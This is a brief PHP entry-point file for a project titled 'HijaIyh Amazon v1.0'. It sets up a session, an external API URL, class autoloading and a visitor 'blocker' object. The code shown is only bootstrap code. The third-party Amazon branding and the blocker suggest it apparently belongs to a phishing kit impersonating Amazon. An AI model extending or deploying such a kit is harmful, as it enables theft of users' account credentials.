<?php 

# HijaIyh Project.
/**
* HijaIyh Amazon v1.0
* @version 1.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

error_reporting(0);

@session_start();
set_time_limit(0);

$API_URL = "https://hijaiyh.me";


spl_autoload_register(function($class)
{
	require_once(__DIR__.'/HijaIyh_App/class/'.$class.'.iyh.php');
});
 
$core = new hicore;
$api = new hiapi(/*$API_URL,@file_get_contents(__DIR__.'/HijaIyh_App/config/.account_key'),@file_get_contents(__DIR__.'/HijaIyh_App/config/.api_key')*/);
$locales = new hilocale;
$blocker = new hiblocker;
require_once(__DIR__.'/HijaIyh_App/AppCheck.php');
